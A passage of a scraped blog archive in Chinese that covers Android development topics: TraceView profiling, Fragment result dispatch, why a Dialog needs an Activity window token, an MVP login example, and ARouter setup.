(tools/monitor) instead. 所以建议使用tools/monitor 启动后跟Eclipse DDMS界面差不多，然后File -&gt; Open File -&gt; 选择trace文件 异常处理异常处理12345&apos;C:\\Windows\\system32\\java.exe&apos; 不是内部或外部命令，也不是可运行的程序 或批处理文件。 SWT folder &apos;&apos; does not exist. Please set ANDROID_SWT to point to the folder containing swt.jar for your platfo rm. 异常信息12345678The standalone version of traceview is deprecated. Please use Android Device Monitor (tools/monitor) instead. Failed to read the trace filejava.io.IOException: Key section does not have an * end marker at com.android.traceview.DmTraceReader.parseKeys(DmTraceReader.java:420) at com.android.traceview.DmTraceReader.generateTrees(DmTraceReader.java:91) at com.android.traceview.DmTraceReader.&lt;init&gt;(DmTraceReader.java:87) at com.android.traceview.MainWindow.main(MainWindow.java:286) 通常是trace文件有异常，再重新生成并导出试试 没有SD卡会出现异常12Unable to open trace file &apos;/sdcard/Love_World_.trace&apos;: Permission denied Caused by: java.lang.RuntimeException: Unable to open trace file &apos;/sdcard/Love_World_.trace&apos;: Permission denied 生成的trace系统自动放在SDCARD上，没有sd卡所以会出现这种异常 第二种使用方法演示Eclipse -&gt; DDMS -&gt; Start Method Profiling 二者的区别，第一种方式更精确到方法，不方便的地方是自己需要添加方法并且要导出文件，第二种方式的优缺点刚好相反。 任意时间点启动与关闭trace启动：am profile &lt;PROCESS&gt; start &lt;FILE&gt; 关闭：am profile &lt;PROCESS&gt; stop &lt;PROCESS&gt; 填写进程名，例如AndroidManifest.xml中声明的包名，通常都是主进程名 例如： adb shell am profile com.example start ./mnt/sdcard/test.trace adb shell am profile com.example stop 启动指定Activity并进行traceam start -n &lt;Package Name&gt;/&lt;Package Name&gt;.&lt;Activity Name&gt; –start-profiler &lt;FILE&gt; 例如： adb shell am start -n com.example/com.example.MainActivity –start-profiler ./mnt/sdcard/test.trace 细节详见官方文档： http://developer.Android.com/tools/help/shell.html TraceView工具面板介绍有两方面用途： 查看跟踪代码的执行时间，分析哪些是耗时操作 可以用于跟踪方法的调用，尤其是android Framework层的方法调用关系 获取方法的调用顺序 在traceview中搜索响应的方法名不能使用大写字母 搜索出的方法会自动展开，其中包含Parents 和 Children 两组信息 点击Parents下的方法名，直接跳转到调用当前的方法处。Children相反 Traceview 面板分上下两部分上面是时间轴面板 (Timeline Panel)左侧显示的是线程信息右侧黑色部分是显示执行时间段、白色是线程暂停时间段，右侧鼠标放在上面会出现时间线纵轴，在顶部会显示当前时间线所执行的具体函数信息*下面是分析面板(Profile Panel) *每一列内容: Inclusive time - 函数本身运行花费时间 + 函数调用其他函数时间 Exclusive time - 函数本身运行花费时间。 Calls + RecurCall/Total 调用 + 重复调用次数 / 函数总调用次数 Cpu Time/Call 总的Cpu时间与总的调用次数之比 表1-1 Profile Panel各列作用说明 列名 描述 Name 该线程运行过程中所调用的函数名 Incl Cpu Time 某函数占用的CPU时间，包含内部调用其它函数的CPU时间 Excl Cpu Time 某函数占用的CPU时间，但不含内部调用其它函数所占用的CPU时间 Incl Real Time 某函数运行的真实时间（以毫秒为单位），内含调用其它函数所占用的真实时间 Excl Real Time 某函数运行的真实时间（以毫秒为单位），不含调用其它函数所占用的真实时间 Call+Recur Calls/Total 某函数被调用次数以及递归调用占总调用次数的百分比 Cpu Time/Call 某函数调用CPU时间与调用次数的比。相当于该函数平均执行时间 Real Time/Call 同CPU Time/Call类似，只不过统计单位换成了真实时间 如何进行具体的分析有两个问题需要解决： 如何定位到所关心的地方？ 上面只是介绍了如何使用TraceView且有两种用法，但是有时使用第一种方式范围又不太精确，使用第二种添加代码的方式，可能有些地方又监听不到。这种情况可以尝试把开始或者结束放到延迟线程中，延迟一段时间在执行开始或者结束。 如何查找出哪些地方比较耗时？ TraceView罗列出了是所有监听到的方法，当然也包括Android系统很多方法的耗时，如何在这么多方法里面查找到自己关心的？ 可以通过TraceView 底部的find 来查找，通常Android app都是有包名的，可以先针对某些关心的列排序后，在通过包名进行一个个查找，这些就省去自己筛选出自己app 方法耗时排行的时间。 相关资料Android系统性能调优工具介绍 （还有具体如何使用进行性能分析的例子，非常棒）Profiling with Traceview and dmtracedumpAndroid 编程下的 TraceView 简介及其案例实战 （含例子）Android代码调试工具 traceview 和 dmtracedump的波折演绎 原文地址： http://blog.csdn.net/love_world_/article/details/8223805","categories":[],"tags":[]},{"title":"Fragment中调用startActivityForResult问题","slug":"Fragment中调用startActivityForResult问题","date":"2017-10-09T12:49:47.000Z","updated":"2020-05-11T07:23:44.661Z","comments":true,"path":"2017/10/09/Fragment中调用startActivityForResult问题/","link":"","permalink":"https://superxlcr.github.io/2017/10/09/Fragment中调用startActivityForResult问题/","excerpt":"","text":"在使用support v4中的Fragment时，如果我们需要调用startActivityForResult方法来与跳转的Activity进行通信时，如果希望Fragment的onActivityResult方法能够被响应，我们就必须调用Fragment的startActivityForResult方法，而不是调用： 1getActivity().startActivityForResult() 后者调用的是Fragment的宿主Activity，即FragmentActivity的startActivityForResult方法。 两者的区别如下：Fragment中的startActivityForResult方法如下： 123456public void startActivityForResult(Intent intent, int requestCode) &#123; if (mActivity == null) &#123; throw new IllegalStateException(\"Fragment \" + this + \" not attached to Activity\"); &#125; mActivity.startActivityFromFragment(this, intent, requestCode);&#125; 调用了FragmentActivity中的startActivityFromFragment方法： 1234567891011public void startActivityFromFragment(Fragment fragment, Intent intent, int requestCode) &#123; if (requestCode == -1) &#123; super.startActivityForResult(intent, -1); return; &#125; if ((requestCode&amp;0xffff0000) != 0) &#123; throw new IllegalArgumentException(\"Can only use lower 16 bits for requestCode\"); &#125; super.startActivityForResult(intent, ((fragment.mIndex+1)&lt;&lt;16) + (requestCode&amp;0xffff));&#125; 可以看到，该方法把Fragment的index值存在了requestCode的高16位，然后调用了startActivityForResult方法。接下来我们来看看消息的返回处理，FragmentActivity中的onActivityResult方法： 1234567891011121314151617181920212223242526/** * Dispatch incoming result to the correct fragment. */@Overrideprotected void onActivityResult(int requestCode, int resultCode, Intent data) &#123; mFragments.noteStateNotSaved(); int index = requestCode&gt;&gt;16; if (index != 0) &#123; index--; if (mFragments.mActive == null || index &lt; 0 || index &gt;= mFragments.mActive.size()) &#123; Log.w(TAG, \"Activity result fragment index out of range: 0x\" + Integer.toHexString(requestCode)); return; &#125; Fragment frag = mFragments.mActive.get(index); if (frag == null) &#123; Log.w(TAG, \"Activity result no fragment exists for index: 0x\" + Integer.toHexString(requestCode)); &#125; else &#123; frag.onActivityResult(requestCode&amp;0xffff, resultCode, data); &#125; return; &#125; super.onActivityResult(requestCode, resultCode, data);&#125; 这里把requestCode的高16位（即Fragment的index值）取了出来，并通过index找到对应的Fragment，然后调用Fragment的onActivityResult来分发消息。因此，如果直接调用Fragment的宿主FragmentActivity的startActivityForResult方法，requestCode中就不会存入Fragment的index值，在onActivityResult处理消息时也会找不到相应的Fragment进行进一步的消息分发。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"为什么Dialog不能用Application的Context","slug":"为什么Dialog不能用Application的Context","date":"2017-09-21T08:10:35.000Z","updated":"2020-05-11T07:23:44.795Z","comments":true,"path":"2017/09/21/为什么Dialog不能用Application的Context/","link":"","permalink":"https://superxlcr.github.io/2017/09/21/为什么Dialog不能用Application的Context/","excerpt":"","text":"有网友在我的一篇和Context相关的面试题文章提到这个问题。我觉得一两句话，不好说清楚（我需要一些图表），所以用这篇文章来回答一下。 先试一下用Application的上下文来创建Dialog，在调用它的show方法时程序会Crash，LogCat的异常信息如下： 12345Caused by: android.view.WindowManager$BadTokenException: Unable to add window -- token null is not for an application at android.view.ViewRootImpl.setView(ViewRootImpl.java:685) at android.view.WindowManagerGlobal.addView(WindowManagerGlobal.java:342) at android.view.WindowManagerImpl.addView(WindowManagerImpl.java:93) at android.app.Dialog.show(Dialog.java:316) 从字面上也很容易理解“BadTokenException: Unable to add window – token null is not for an application”，发生一个BadTokenException的异常，不能添加Window。 在解释这个问题前，有必要先理清一些概念： Window: 定义窗口样式和行为的抽象基类，用于作为顶层的view加到WindowManager中，其实现类是PhoneWindow。 每个Window都需要指定一个Type（应用窗口、子窗口、系统窗口）。Activity对应的窗口是应用窗口；PopupWindow，ContextMenu，OptionMenu是常用的子窗口；像Toast和系统警告提示框（如ANR）就是系窗口，还有很多应用的悬浮框也属于系统窗口类型。 WindowManager：用来在应用与window之间的管理接口，管理窗口顺序，消息等。 WindowManagerService：简称Wms，WindowManagerService管理窗口的创建、更新和删除，显示顺序等，是WindowManager这个管理接品的真正的实现类。它运行在System_server进程，作为服务端，客户端（应用程序）通过IPC调用和它进行交互。 Token：这里提到的Token主是指窗口令牌（Window Token），是一种特殊的Binder令牌，Wms用它唯一标识系统中的一个窗口。 下图显示了Activity的Window和Wms的关系： Activity有一个PhoneWindow，当我们调用setContentView时，其实最终结果是把我们的DecorView作为子View添加到PhoneWindow的DecorView中。而最终这个DecorView，过WindowMnagerImpl的addView方法添加到WMS中去的，由WMS负责管理和绘制（真正的绘制在SurfaceFlinger服务中）。 Dialog的窗口属于什么类型跟Activity对应的窗口一样，Dialog有一个PhoneWindow的实例。Dialog 的类型是TYPE_APPLICATION，属于应用窗口类型。 可以从Dialog的创建代码得到确认： 12345678910111213Dialog(@NonNull Context context, @StyleRes int themeResId, boolean createContextThemeWrapper) &#123; // 忽略一些代码 mWindowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE); final Window w = new PhoneWindow(mContext); mWindow = w; w.setCallback(this); w.setOnWindowDismissedCallback(this); w.setWindowManager(mWindowManager, null, null); w.setGravity(Gravity.CENTER); mListenersHandler = new ListenersHandler(this);&#125; 注意w.setWindowManager(mWindowManager, null, null)这句，把appToken设置为null。这也是Dialog和Activity窗口的一个区别，Activity会将这个appToken设置为ActivityThread传过来的token。 1public void setWindowManager(WindowManager wm, IBinder appToken, String appName) 然后在Dialog的show方法中： 12345678910111213141516171819202122public void show() &#123; // 忽略一些代码 mDecor = mWindow.getDecorView(); WindowManager.LayoutParams l = mWindow.getAttributes(); if ((l.softInputMode &amp; WindowManager.LayoutParams.SOFT_INPUT_IS_FORWARD_NAVIGATION) == 0) &#123; WindowManager.LayoutParams nl = new WindowManager.LayoutParams(); nl.copyFrom(l); nl.softInputMode |= WindowManager.LayoutParams.SOFT_INPUT_IS_FORWARD_NAVIGATION; l = nl; &#125; try &#123; mWindowManager.addView(mDecor, l); mShowing = true; sendShowMessage(); &#125; finally &#123; &#125;&#125; mWindow是PhoneWindow类型，mWindow.getAttributes()默认获取到的Type为TYPE_APPLICATION。 Dialog最终也是通过系统的WindowManager把自己的Window添加到WMS上。在addView前，Dialog的token是null（上面提到过的w.setWindowManager第二参数为空）。 Dialog初化始时是通过Context.getSystemServer 来获取 WindowManager，而如果用Application或者Service的Context去获取这个WindowManager服务的话，会得到一个WindowManagerImpl的实例，这个实例里token也是空的。之后在Dialog的show方法中将Dialog的View(PhoneWindow.getDecorView())添加到WindowManager时会给token设置默认值还是null。 如果这个Context是Activity，则直接返回Activity的mWindowManager，这个mWindowManager在Activity的attach方法被创建，Token指向此Activity的Token，mParentWindow为Activity的Window本身。如下的代码Activity重写了getSystemService这个方法： 123456789101112131415@Overridepublic Object getSystemService(@ServiceName @NonNull String name) &#123; if (getBaseContext() == null) &#123; throw new IllegalStateException( \"System services not available to Activities before onCreate()\"); &#125; if (WINDOW_SERVICE.equals(name)) &#123; return mWindowManager; &#125; else if (SEARCH_SERVICE.equals(name)) &#123; ensureSearchManager(); return mSearchManager; &#125; return super.getSystemService(name);&#125; 系统对TYPE_APPLICATION类型的窗口，要求必需是Activity的Token，不是的话系统会抛出BadTokenException异常。Dialog 是应用窗口类型，Token必须是Activity的Token。 问题的答案那为什么一定要是Activity的Token呢？我想使用Token应该是为了安全问题，通过Token来验证WindowManager服务请求方是否是合法的。如果我们可以使用Application的Context，或者说Token可以不是Activity的Token，那么用户可能已经跳转到别的应用的Activity界面了，但我们却可以在别人的界面上弹出我们的Dialog，想想就觉得很危险。 如你跳到了微信界面了，这时在后台的某个应用里调用Dialog的show，那么微信的界面上会显示一个Dialog，这个Dialog可能会让用户输入密码什么的，而用户完全无法区分是不是微信弹出的。 Even 原创 简书链接：http://www.jianshu.com/users/f9fbc7a39b36/latest_articles 转载请注明出处。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"MVP 模式简单易懂的介绍方式","slug":"MVP-模式简单易懂的介绍方式","date":"2017-09-16T02:43:00.000Z","updated":"2020-05-11T07:23:44.719Z","comments":true,"path":"2017/09/16/MVP-模式简单易懂的介绍方式/","link":"","permalink":"https://superxlcr.github.io/2017/09/16/MVP-模式简单易懂的介绍方式/","excerpt":"","text":"本文转载自：http://kaedea.com/2015/10/11/android-mvp-pattern/ Android MVP 模式 [1]也不是什么新鲜的东西了，我在自己的项目里也普遍地使用了这个设计模式。当项目越来越庞大、复杂，参与的研发人员越来越多的时候，MVP 模式 的优势就充分显示出来了。MVP 模式是 MVC 模式在 Android 上的一种变体，要介绍 MVP 就得先介绍 MVC。在 MVC 模式中，Activity 应该是属于 View 这一层。而实质上，它既承担了 View，同时也包含一些 Controller 的东西在里面。这对于开发与维护来说不太友好，耦合度大高了。把 Activity 的 View 和 Controller 抽离出来就变成了 View 和 Presenter，这就是 MVP 模式.。 基本信息 作者：Kaede Akatsuki 项目：Android-MVP-Pattern 出处：Android MVP 模式 简单易懂的介绍方式 MVP 模式（Model-View-Presenter）可以说是 MVC 模式（Model-View-Controller）在 Android 开发上的一种变种、进化模式。后者大家可能比较熟悉，就算不熟悉也可能或多或少地在自己的项目中用到过。要介绍 MVP 模式，就不得不先说说 MVC 模式。 MVC 模式MVC 模式的结构分为三部分，实体层的 Model，视图层的 View，以及控制层的 Controller。MVC结构 其中 View 层其实就是程序的 UI 界面，用于向用户展示数据以及接收用户的输入 而 Model 层就是 JavaBean 实体类，用于保存实例数据 Controller 控制器用于更新 UI 界面和数据实例 例如，View 层接受用户的输入，然后通过 Controller 修改对应的 Model 实例；同时，当 Model 实例的数据发生变化的时候，需要修改 UI 界面，可以通过 Controller 更新界面。（View 层也可以直接更新 Model 实例的数据，而不用每次都通过 Controller，这样对于一些简单的数据更新工作会变得方便许多。）举个简单的例子，现在要实现一个飘雪的动态壁纸，可以给雪花定义一个实体类 Snow，里面存放 XY 轴坐标数据，View 层当然就是 SurfaceView（或者其他视图），为了实现雪花飘的效果，可以启动一个后台线程，在线程里不断更新 Snow 实例里的坐标值，这部分就是 Controller 的工作了，Controller 里还要定时更新 SurfaceView 上面的雪花。进一步的话，可以在 SurfaceView 上监听用户的点击，如果用户点击，只通过 Controller 对触摸点周围的 Snow 的坐标值进行调整，从而实现雪花在用户点击后出现弹开等效果。具体的 MVC 模式请自行 Google。 MVP 模式在 Android 项目中，Activity 和 Fragment 占据了大部分的开发工作。如果有一种设计模式（或者说代码结构）专门是为优化 Activity 和 Fragment 的代码而产生的，你说这种模式重要不？这就是 MVP 设计模式。按照 MVC 的分层，Activity 和 Fragment（后面只说 Activity）应该属于 View 层，用于展示 UI 界面，以及接收用户的输入，此外还要承担一些生命周期的工作。Activity 是在 Android 开发中充当非常重要的角色，特别是 TA 的生命周期的功能，所以开发的时候我们经常把一些业务逻辑直接写在 Activity 里面，这非常直观方便，代价就是 Activity 会越来越臃肿，超过 1000 行代码是常有的事，而且如果是一些可以通用的业务逻辑（比如用户登录），写在具体的 Activity 里就意味着这个逻辑不能复用了。如果有进行代码重构经验的人，看到 1000 + 行的类肯定会有所顾虑。因此，Activity 不仅承担了 View 的角色，还承担了一部分的 Controller 角色，这样一来 V 和 C 就耦合在一起了，虽然这样写方便，但是如果业务调整的话，要维护起来就难了，而且在一个臃肿的 Activity 类查找业务逻辑的代码也会非常蛋疼，所以看起来有必要在 Activity 中，把 View 和 Controller 抽离开来，而这就是 MVP 模式的工作了。MVP结构MVP 模式的核心思想 MVP 把 Activity 中的 UI 逻辑抽象成 View 接口，把业务逻辑抽象成 Presenter 接口，Model 类还是原来的 Model。 这就是 MVP 模式，现在这样的话，Activity 的工作的简单了，只用来响应生命周期，其他工作都丢到 Presenter 中去完成。从上图可以看出，Presenter 是 Model 和 View 之间的桥梁，为了让结构变得更加简单，View 并不能直接对 Model 进行操作，这也是 MVP 与 MVC 最大的不同之处。 MVP 模式的作用MVP 的好处都有啥，谁说对了就给他 KIRA!!(&lt;ゝω·)☆ 分离了视图逻辑和业务逻辑，降低了耦合 Activity 只处理生命周期的任务，代码变得更加简洁 视图逻辑和业务逻辑分别抽象到了 View 和 Presenter 的接口中去，提高代码的可阅读性 Presenter 被抽象成接口，可以有多种具体的实现，所以方便进行单元测试 把业务逻辑抽到 Presenter 中去，避免后台线程引用着 Activity 导致 Activity 的资源无法被系统回收从而引起内存泄露和 OOM 其中最重要的有三点 Activity 代码变得更加简洁相信很多人阅读代码的时候，都是从 Activity 开始的，对着一个 1000 + 行代码的 Activity，看了都觉得难受。使用 MVP 之后，Activity 就能瘦身许多了，基本上只有 FindView、SetListener 以及 Init 的代码。其他的就是对 Presenter 的调用，还有对 View 接口的实现。这种情形下阅读代码就容易多了，而且你只要看 Presenter 的接口，就能明白这个模块都有哪些业务，很快就能定位到具体代码。Activity 变得容易看懂，容易维护，以后要调整业务、删减功能也就变得简单许多。 方便进行单元测试一般单元测试都是用来测试某些新加的业务逻辑有没有问题，如果采用传统的代码风格（习惯性上叫做 MV 模式，少了 P），我们可能要先在 Activity 里写一段测试代码，测试完了再把测试代码删掉换成正式代码，这时如果发现业务有问题又得换回测试代码，咦，测试代码已经删掉了！好吧重新写吧……MVP 中，由于业务逻辑都在 Presenter 里，我们完全可以写一个 PresenterTest 的实现类继承 Presenter 的接口，现在只要在 Activity 里把 Presenter 的创建换成 PresenterTest，就能进行单元测试了，测试完再换回来即可。万一发现还得进行测试，那就再换成 PresenterTest 吧。 避免 Activity 的内存泄露Android APP 发生 OOM 的最大原因就是出现内存泄露造成 APP 的内存不够用，而造成内存泄露的两大原因之一就是 Activity 泄露（Activity Leak）（另一个原因是 Bitmap 泄露（Bitmap Leak））。 Java 一个强大的功能就是其虚拟机的内存回收机制，这个功能使得 Java 用户在设计代码的时候，不用像 C++ 用户那样考虑对象的回收问题。然而，Java 用户总是喜欢随便写一大堆对象，然后幻想着虚拟机能帮他们处理好内存的回收工作。可是虚拟机在回收内存的时候，只会回收那些没有被引用的对象，被引用着的对象因为还可能会被调用，所以不能回收。 Activity 是有生命周期的，用户随时可能切换 Activity，当 APP 的内存不够用的时候，系统会回收处于后台的 Activity 的资源以避免 OOM。采用传统的 MV 模式，一大堆异步任务和对 UI 的操作都放在 Activity 里面，比如你可能从网络下载一张图片，在下载成功的回调里把图片加载到 Activity 的 ImageView 里面，所以异步任务保留着对 Activity 的引用。这样一来，即使 Activity 已经被切换到后台（onDestroy 已经执行），这些异步任务仍然保留着对 Activity 实例的引用，所以系统就无法回收这个 Activity 实例了，结果就是 Activity Leak。Android 的组件中，Activity 对象往往是在堆（Java Heap）里占最多内存的，所以系统会优先回收 Activity 对象，如果有 Activity Leak，APP 很容易因为内存不够而 OOM。采用 MVP 模式，只要在当前的 Activity 的 onDestroy 里，分离异步任务对 Activity 的引用，就能避免 Activity Leak。说了这么多，没看懂？好吧，我自己都没看懂自己写的，我们还是直接看代码吧。 MVP 模式的使用简单MVP的UML上面一张简单的 MVP 模式的 UML 图，从图中可以看出，使用 MVP，至少需要经历以下步骤： 创建 IPresenter 接口，把所有业务逻辑的接口都放在这里，并创建它的实现 PresenterCompl（在这里可以方便地查看业务功能，由于接口可以有多种实现所以也方便写单元测试） 创建 IView 接口，把所有视图逻辑的接口都放在这里，其实现类是当前的 Activity/Fragment 由 UML 图可以看出，Activity 里包含了一个 IPresenter，而 PresenterCompl 里又包含了一个 IView 并且依赖了 Model。Activity 里只保留对 IPresenter 的调用，其它工作全部留到 PresenterCompl 中实现 Model 并不是必须有的，但是一定会有 View 和 Presenter 通过上面的介绍，MVP 的主要特点就是把 Activity 里的许多逻辑都抽离到 View 和 Presenter 接口中去，并由具体的实现类来完成。这种写法多了许多 IView 和 IPresenter 的接口，在某种程度上加大了开发的工作量，刚开始使用 MVP 的小伙伴可能会觉得这种写法比较别扭，而且难以记住。其实一开始想太多也没有什么卵用，只要在具体项目中多写几次，就能熟悉 MVP 模式的写法，理解 TA 的意图，以及享♂受其带来的好处。扯了这么多，但是好像并没有什么卵用，毕竟 Talk is cheap, let me show you the code! 所以还是来写一下实际的项目吧。 MVP 模式简单实例一个简单的登录界面（实在想不到别的了╮(￣▽￣”)╭），点击 LOGIN 则进行账号密码验证，点击 CLEAR 则重置输入。项目结构看起来像是这个样子的，MVP 的分层还是很清晰的。我的习惯是先按模块分 Package，在模块下面再去创建** model、view、presenter** 的子 Package，当然也可以用** model、view、presenter** 作为顶级的 Package，然后把所有的模块的 model、view、presenter 类都到这三个顶级 Package 中，就好像有人喜欢把项目里所有的 Activity、Fragment、Adapter 都放在一起一样。首先来看看 LoginActivity LoginActivity.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class LoginActivity extends ActionBarActivity implements ILoginView, View.OnClickListener &#123;private EditText editUser;private EditText editPass;private Button btnLogin;private Button btnClear;ILoginPresenter loginPresenter;private ProgressBar progressBar;@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //find view editUser = (EditText) this.findViewById(R.id.et_login_username); editPass = (EditText) this.findViewById(R.id.et_login_password); btnLogin = (Button) this.findViewById(R.id.btn_login_login); btnClear = (Button) this.findViewById(R.id.btn_login_clear); progressBar = (ProgressBar) this.findViewById(R.id.progress_login); //set listener btnLogin.setOnClickListener(this); btnClear.setOnClickListener(this); //init loginPresenter = new LoginPresenterCompl(this); loginPresenter.setProgressBarVisiblity(View.INVISIBLE);&#125;@Overridepublic void onClick(View v) &#123; switch (v.getId())&#123; case R.id.btn_login_clear: loginPresenter.clear(); break; case R.id.btn_login_login: loginPresenter.setProgressBarVisiblity(View.VISIBLE); btnLogin.setEnabled(false); btnClear.setEnabled(false); loginPresenter.doLogin(editUser.getText().toString(), editPass.getText().toString()); break; &#125;&#125;@Overridepublic void onClearText() &#123; editUser.setText(\"\"); editPass.setText(\"\");&#125;@Overridepublic void onLoginResult(Boolean result, int code) &#123; loginPresenter.setProgressBarVisiblity(View.INVISIBLE); btnLogin.setEnabled(true); btnClear.setEnabled(true); if (result)&#123; Toast.makeText(this,\"Login Success\",Toast.LENGTH_SHORT).show(); startActivity(new Intent(this, HomeActivity.class)); &#125; else &#123; Toast.makeText(this,\"Login Fail, code = \" + code,Toast.LENGTH_SHORT).show(); &#125;@Overridepublic void onSetProgressBarVisibility(int visibility) &#123; progressBar.setVisibility(visibility);&#125; 从代码可以看出 LoginActivity 只做了 findView 以及 setListener 的工作，而且包含了一个 ILoginPresenter，所有业务逻辑都是通过调用 ILoginPresenter 的具体接口来完成。所以 LoginActivity 的代码看起来很舒爽，甚至有点愉♂悦呢 (/ω＼x)。视力不错的你可能还看到了 ILoginView 接口的实现，如果不懂为什么要这样写的话，可以先往下看，这里只要记住 “LoginActivity 实现了 ILoginView 接口”。 再来看看 ILoginPresenter ILoginPresenter.java 12345public interface ILoginPresenter &#123; void clear(); void doLogin(String name, String passwd); void setProgressBarVisiblity(int visiblity);&#125; LoginPresenterCompl.java 12345678910111213141516171819202122232425262728293031323334public class LoginPresenterCompl implements ILoginPresenter &#123; ILoginView iLoginView; IUser user; Handler handler; public LoginPresenterCompl(ILoginView iLoginView) &#123; this.iLoginView = iLoginView; initUser(); handler = new Handler(Looper.getMainLooper()); &#125; @Override public void clear() &#123; iLoginView.onClearText(); &#125; @Override public void doLogin(String name, String passwd) &#123; Boolean isLoginSuccess = true; final int code = user.checkUserValidity(name,passwd); if (code!=0) isLoginSuccess = false; final Boolean result = isLoginSuccess; handler.postDelayed(new Runnable() &#123; @Override public void run() &#123; iLoginView.onLoginResult(result, code); &#125; &#125;, 3000); &#125; @Override public void setProgressBarVisiblity(int visiblity)&#123; iLoginView.onSetProgressBarVisibility(visiblity); &#125; private void initUser()&#123; user = new UserModel(\"mvp\",\"mvp\"); &#125;&#125; 从代码可以看出，LoginPresenterCompl 保留了 ILoginView 的引用，因此在 LoginPresenterCompl 里就可以直接进行 UI 操作了，而不用在 Activity 里完成。这里使用了 ILoginView 引用，而不是直接使用 Activity，这样一来，如果在别的 Activity 里也需要用到相同的业务逻辑，就可以直接复用 LoginPresenterCompl 类了（一个 Activity 可以包含一个以上的 Presenter，总之，需要什么业务就 new 什么样的 Presenter，是不是很灵活（＠￣︶￣＠）），这也是 MVP 的核心思想 通过 IVIew 和 IPresenter，把 Activity 的UI Logic和Business Logic分离开来，Activity just does its basic job! 至于 Model 嘛，还是原来 MVC 里的 Model。 再来看看 ILoginView，至于 ILoginView 的实现类呢，翻到上面看看 LoginActivity 吧 ILoginView.java 12345public interface ILoginView &#123; public void onClearText(); public void onLoginResult(Boolean result, int code); public void onSetProgressBarVisibility(int visibility);&#125; 代码这种东西放在日志里讲好像除了把整个版面拉长没什么卵用，我把几种自己常用的 MVP 的写法写成一个 Demo 项目，欢迎围观和 PullRequest：Android-MVP-Pattern。 后记以上就是我的 MVP 模式的一点理解，在 MVVM 模式还没有成熟的现在，我觉得没有比 MVP 模式更好的替代品了。当然今天写的只是 MVP 的基础使用，介绍的实例项目也非常简单，看不出 MVP 的优势，后面还会针对 MVP 模式写一些日志，就目前能想到的至少包括 Android 常规的开发模式经常被称为 MV 模式（Model-View），引入数据绑定后的 MVVM 模式（Model-View-ViewModel），与 MVP 模式的区别 目前我们写 ListView 的 Adapter 都喜欢把它写成一个内部类，如果有两个 Activity 里要用同一个 Adapter 就比较难了，通过 MVP 模式，能轻松地复用 Adapter（你说已经不用 ListView 了，这不是重点不是么 (˃◡˂)） MVP 模式需要多写许多新的接口，这也是其缺点所在，经过一段时间的实战，我自己已有一种优化的 MVP 模式，我会试着总结一下，把她拿出来说说 附录 [1] : 我也纠结过** MVP 模式或者 MVP 结构的说法那个跟准确一点，国外普遍的叫法是直接叫 Android MVP，除此之外有叫 MVP Pattern** 的也有叫** MVP Framework/Architecture**，个人认为这应该算是一种代码风格（Code Style），在分类上应该比较类似设计模式（Design Pattern），所以现在我一般称为模式，不过这不是重点，不是吗。(˃◡˂)","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"设计模式","slug":"设计模式","permalink":"https://superxlcr.github.io/tags/设计模式/"}]},{"title":"ARouter 学习记录","slug":"ARouter-学习记录","date":"2017-09-13T06:53:35.000Z","updated":"2020-05-11T07:23:44.487Z","comments":true,"path":"2017/09/13/ARouter-学习记录/","link":"","permalink":"https://superxlcr.github.io/2017/09/13/ARouter-学习记录/","excerpt":"","text":"ARouter 是阿里巴巴开源的一个Android页面路由框架，它提供了url跳转、自动解析bundle数据赋值，自定义拦截跳转过程，url调用接口服务等功能下面我们来了解下ARouter 框架的使用 框架配置与初始化gradle 版本 &gt;= 2.2 的配置方法（使用annotationProcessor）： 123456789101112131415161718android &#123; defaultConfig &#123; ... javaCompileOptions &#123; annotationProcessorOptions &#123; arguments = [ moduleName : project.getName() ] &#125; &#125; &#125;&#125;dependencies &#123; // 替换成最新版本, 需要注意的是api // 要与compiler匹配使用，均使用最新版可以保证兼容 compile 'com.alibaba:arouter-api:x.x.x' annotationProcessor 'com.alibaba:arouter-compiler:x.x.x' ...&#125; gradle 版本 &lt; 2.2 的配置方法（使用apt）： 1234567891011121314151617181920212223apply plugin: 'com.neenbedankt.android-apt'buildscript &#123; repositories &#123; jcenter() &#125; dependencies &#123; classpath 'com.neenbedankt.gradle.plugins:android-apt:1.4' &#125;&#125;apt &#123; arguments &#123; moduleName project.getName(); &#125;&#125;dependencies &#123; compile 'com.alibaba:arouter-api:x.x.x' apt 'com.alibaba:arouter-compiler:x.x.x' ...&#125; 在Application中初始化ARouter： 123456789101112public class MyApplication extends Application &#123; @Override public void onCreate() &#123; super.onCreate(); if (BuildConfig.DEBUG) &#123; // 这两行必须写在init之前，否则这些配置在init过程中将无效 ARouter.openLog(); // 打印日志 ARouter.openDebug(); // 开启调试模式(如果在InstantRun模式下运行，必须开启调试模式！线上版本需要关闭,否则有安全风险) &#125; ARouter.init(this); // 尽可能早，推荐在Application中初始化 &#125;&#125; Activity基础跳转在Activity声明注解Route，并赋予path值（即url），值得注意的是path必须至少有两级目录，否则会在编译期报错： 12@Route(path = \"/arouterTest/activities/jumpTestActivity\")public class JumpTestActivity extends AppCompatActivity &#123; 然后调用ARouter的build方法输入url，调用navigation方法即可打开对应的Activity： 1ARouter.getInstance().build(\"/arouterTest/activities/jumpTestActivity\").navigation(); 也可以传入uri进行跳转： 123Uri testUri = Uri.parse(\"test://test.com/arouterTest/activities/jumpTestActivity\");ARouter.getInstance().build(testUri) .navigation(); 需要接收ActivityResult的可以在navigation中传入requestCode： 1ARouter.getInstance().build(\"/arouterTest/activities/jumpTestActivity\").navigation(this, 666); 传递参数与参数注入传递参数调用ARouter的with系列方法即可： with各种基本类型 withObject withParcelable with：直接传递Bundle参数 例，传入名为text的字符串参数： 123ARouter.getInstance().build(\"/arouterTest/activities/jumpTestActivity\") .withString(\"text\", \"老子吃火锅，你吃火锅底料！\") .navigation(); 参数注入，即在目标Activity中自动解析传入的参数： 首先我们需要使用Autowired注解，并且把注解标记的属性设置为public的： 12@Autowired(name = \"text\")public String text; 